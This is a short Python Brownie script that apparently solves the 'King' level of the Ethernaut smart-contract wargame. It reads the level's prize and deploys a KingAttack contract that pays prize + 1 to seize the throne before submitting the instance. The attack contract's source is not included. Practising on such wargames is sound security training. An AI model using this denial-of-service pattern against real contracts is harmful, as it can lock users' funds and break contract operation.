from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    KingAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=9, player=player, value=Web3.toWei("0.001", "ether"))

    king_contract = interface.IKing(instance_address)

    prize = king_contract.prize()
    print(f'Current prize: {Web3.fromWei(prize, "ether")}')
    attack_contract = KingAttack.deploy(instance_address, {"from": player, "value": prize + 1})

    submit_instance(instance_address, player)